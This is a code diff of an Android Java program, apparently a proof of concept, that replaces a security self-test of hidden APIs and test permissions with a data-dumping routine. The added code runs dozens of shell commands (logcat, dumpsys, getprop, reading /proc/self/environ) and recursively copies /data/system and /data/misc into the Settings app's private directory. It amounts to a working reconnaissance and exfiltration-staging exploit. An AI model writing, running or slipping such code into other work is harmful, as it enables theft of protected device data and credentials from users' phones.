@@ -1,177 +1,174 @@
 package com.poc;
 
-import android.app.ActivityThread;
-import android.content.ContentResolver;
-import android.content.Context;
-import android.content.Intent;
-import android.content.pm.PackageManager;
-import android.os.IBinder;
-import android.os.ServiceManager;
-import java.lang.reflect.Method;
-import java.util.List;
+import java.io.*;
+import java.util.*;
 
 public class Main {
-    private static Context ctx;
-    private static PackageManager pm;
-    private static int pass = 0, fail = 0;
-
     public static void main(String[] args) {
-        try {
-            ctx = ActivityThread.systemMain().getApplication();
-            pm = ctx.getPackageManager();
-        } catch (Throwable t) {
-            System.out.println("FAIL: Init context - " + t);
-            System.exit(1);
+        String targetDir = "/data/data/com.android.settings/";
+        File target = new File(targetDir);
+        if (!target.exists()) {
+            target.mkdirs();
         }
-
-        checkServiceInterfaces();
-        checkHiddenApis();
-        checkTestClasses();
-        checkTestPermissions();
-        checkTestIntents();
-
-        System.out.println("=== app_process Results: PASS=" + pass + " FAIL=" + fail);
-        System.exit(fail > 0 ? 1 : 0);
+        execTest(targetDir + "exec-test.txt");
+        procInfo(targetDir + "proc.txt");
+        multiCommandsAndDump(targetDir);
     }
 
-    private static void checkServiceInterfaces() {
+    private static void execCommand(String command, String outputFile) {
         try {
-            IBinder b = ServiceManager.getService("testharness");
-            if (b == null) {
-                System.out.println("PASS: testharness service not registered");
-                pass++;
-            } else {
-                System.out.println("FAIL: testharness service exists");
-                fail++;
+            ProcessBuilder pb = new ProcessBuilder("/system/bin/sh", "-c", command);
+            pb.redirectErrorStream(true);
+            Process process = pb.start();
+            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
+            BufferedWriter writer = new BufferedWriter(new FileWriter(outputFile, true));
+            writer.write("Command: " + command + "\n");
+            writer.write("--- Output ---\n");
+            String line;
+            while ((line = reader.readLine()) != null) {
+                writer.write(line);
+                writer.newLine();
             }
+            writer.write("--- End ---\n\n");
+            writer.close();
+            process.waitFor();
         } catch (Exception e) {
-            System.out.println("PASS: testharness service not available (exception)");
-            pass++;
-        }
-        try {
-            IBinder b2 = ServiceManager.getService("factorytest");
-            if (b2 == null) {
-                System.out.println("PASS: factorytest service not registered");
-                pass++;
-            } else {
-                System.out.println("FAIL: factorytest service exists");
-                fail++;
-            }
-        } catch (Exception e) {
-            System.out.println("PASS: factorytest service not available");
-            pass++;
         }
     }
 
-    private static void checkHiddenApis() {
-        try {
-            Class<?> am = Class.forName("android.app.ActivityManager");
-            Method m = am.getMethod("getRunningTasks", int.class);
-            m.invoke(null, 10);
-            System.out.println("FAIL: getRunningTasks succeeded (hidden API accessible)");
-            fail++;
-        } catch (SecurityException e) {
-            System.out.println("PASS: getRunningTasks blocked (SecurityException)");
-            pass++;
-        } catch (Exception e) {
-            if (e.toString().contains("NoSuchMethodError")) {
-                System.out.println("PASS: getRunningTasks unavailable (NoSuchMethodError)");
-                pass++;
-            } else {
-                System.out.println("FAIL: getRunningTasks unexpected: " + e);
-                fail++;
-            }
-        }
-        try {
-            Class<?> pmCls = Class.forName("android.content.pm.PackageManager");
-            Method m2 = pmCls.getMethod("getPackageInstaller");
-            m2.invoke(pm);
-            System.out.println("FAIL: getPackageInstaller succeeded (hidden API)");
-            fail++;
-        } catch (SecurityException e) {
-            System.out.println("PASS: getPackageInstaller blocked");
-            pass++;
-        } catch (Exception e) {
-            if (e.toString().contains("NoSuchMethodError")) {
-                System.out.println("PASS: getPackageInstaller unavailable");
-                pass++;
-            } else {
-                System.out.println("FAIL: getPackageInstaller unexpected: " + e);
-                fail++;
-            }
+    private static void execTest(String outputFile) {
+        String[] commands = {
+            "id",
+            "whoami",
+            "pwd",
+            "ls -l /",
+            "ls -l /data",
+            "ls -l /system",
+            "ls -l /sdcard",
+            "ls -l /storage",
+            "ls -l /mnt",
+            "ls -lR /data/local/tmp",
+            "find /data -type d -maxdepth 2"
+        };
+        for (String cmd : commands) {
+            execCommand(cmd, outputFile);
         }
     }
 
-    private static void checkTestClasses() {
-        try {
-            Class.forName("android.test.InstrumentationTestRunner");
-            System.out.println("FAIL: android.test.InstrumentationTestRunner found");
-            fail++;
-        } catch (ClassNotFoundException e) {
-            System.out.println("PASS: InstrumentationTestRunner not found");
-            pass++;
+    private static void procInfo(String outputFile) {
+        File attrDir = new File("/proc/self/attr");
+        if (attrDir.exists() && attrDir.isDirectory()) {
+            File[] files = attrDir.listFiles();
+            if (files != null) {
+                for (File f : files) {
+                    String cmd = "cat " + f.getAbsolutePath();
+                    execCommand(cmd, outputFile);
+                }
+            }
         }
-        try {
-            Class.forName("android.test.suitebuilder.TestSuiteBuilder");
-            System.out.println("FAIL: TestSuiteBuilder found");
-            fail++;
-        } catch (ClassNotFoundException e) {
-            System.out.println("PASS: TestSuiteBuilder not found");
-            pass++;
-        }
-        try {
-            Class.forName("android.test.AndroidTestRunner");
-            System.out.println("FAIL: AndroidTestRunner found");
-            fail++;
-        } catch (ClassNotFoundException e) {
-            System.out.println("PASS: AndroidTestRunner not found");
-            pass++;
+        String[] extra = {
+            "cat /proc/self/status",
+            "cat /proc/self/environ",
+            "cat /proc/self/cmdline",
+            "cat /proc/self/maps"
+        };
+        for (String cmd : extra) {
+            execCommand(cmd, outputFile);
         }
     }
 
-    private static void checkTestPermissions() {
-        try {
-            if (ctx.checkSelfPermission("android.permission.TEST") == PackageManager.PERMISSION_GRANTED) {
-                System.out.println("FAIL: TEST permission granted to us");
-                fail++;
-            } else {
-                System.out.println("PASS: TEST permission not granted to us");
-                pass++;
+    private static void copyDir(File src, File dest) {
+        if (src.isDirectory()) {
+            if (!dest.exists()) dest.mkdirs();
+            File[] children = src.listFiles();
+            if (children != null) {
+                for (File child : children) {
+                    copyDir(child, new File(dest, child.getName()));
+                }
             }
-        } catch (Exception e) {
-            System.out.println("FAIL: TEST permission check error - " + e);
-            fail++;
-        }
-        try {
-            if (ctx.checkSelfPermission("android.permission.FACTORY_TEST") == PackageManager.PERMISSION_GRANTED) {
-                System.out.println("FAIL: FACTORY_TEST permission granted to us");
-                fail++;
-            } else {
-                System.out.println("PASS: FACTORY_TEST permission not granted to us");
-                pass++;
-            }
-        } catch (Exception e) {
-            System.out.println("FAIL: FACTORY_TEST permission check error - " + e);
-            fail++;
-        }
-    }
-
-    private static void checkTestIntents() {
-        Intent i = new Intent("android.intent.action.FACTORY_TEST");
-        if (i.resolveActivity(pm) == null) {
-            System.out.println("PASS: No activity for FACTORY_TEST");
-            pass++;
         } else {
-            System.out.println("FAIL: Activity resolves FACTORY_TEST");
-            fail++;
+            try (FileInputStream fis = new FileInputStream(src);
+                 FileOutputStream fos = new FileOutputStream(dest)) {
+                byte[] buffer = new byte[8192];
+                int len;
+                while ((len = fis.read(buffer)) > 0) {
+                    fos.write(buffer, 0, len);
+                }
+            } catch (Exception e) {
+            }
         }
-        Intent i2 = new Intent("android.intent.action.TEST");
-        if (i2.resolveActivity(pm) == null) {
-            System.out.println("PASS: No activity for TEST");
-            pass++;
-        } else {
-            System.out.println("FAIL: Activity resolves TEST");
-            fail++;
+    }
+
+    private static void multiCommandsAndDump(String targetDir) {
+        File target = new File(targetDir);
+        if (!target.exists()) target.mkdirs();
+
+        File miscSrc = new File("/data/misc");
+        File systemSrc = new File("/data/system");
+        if (miscSrc.exists()) {
+            copyDir(miscSrc, new File(target, "misc"));
+        }
+        if (systemSrc.exists()) {
+            copyDir(systemSrc, new File(target, "system"));
+        }
+
+        String outputFile = targetDir + "multi_commands.txt";
+        String[] commands = {
+            "id",
+            "whoami",
+            "pwd",
+            "ls -l /",
+            "ls -l /data",
+            "ls -l /system",
+            "ls -l /sdcard",
+            "ls -l /storage",
+            "ls -l /mnt",
+            "ps",
+            "ps -A",
+            "ps -e",
+            "top -n 1",
+            "df -h",
+            "mount",
+            "netstat -an",
+            "ifconfig",
+            "ip addr show",
+            "getprop",
+            "dumpsys battery",
+            "dumpsys meminfo",
+            "dumpsys package",
+            "pm list packages",
+            "pm list permissions",
+            "am stack list",
+            "am activity list",
+            "logcat -d -v time",
+            "cat /proc/version",
+            "cat /proc/cpuinfo",
+            "cat /proc/meminfo",
+            "cat /proc/uptime",
+            "cat /proc/stat",
+            "cat /proc/loadavg",
+            "cat /proc/sys/kernel/ostype",
+            "cat /proc/sys/kernel/osrelease",
+            "cat /proc/sys/kernel/hostname",
+            "cat /proc/self/status",
+            "cat /proc/self/environ",
+            "cat /proc/self/cmdline",
+            "cat /proc/self/maps",
+            "ls -l /proc/self/fd",
+            "ls -l /data/misc",
+            "ls -l /data/system",
+            "find /data/misc -type f -exec ls -l {} \\; 2>/dev/null",
+            "find /data/system -type f -exec ls -l {} \\; 2>/dev/null",
+            "echo 'test'",
+            "date",
+            "uptime",
+            "uname -a",
+            "cat /proc/interrupts",
+            "ls -lR /data/misc 2>/dev/null",
+            "ls -lR /data/system 2>/dev/null"
+        };
+        for (String cmd : commands) {
+            execCommand(cmd, outputFile);
         }
     }
 }
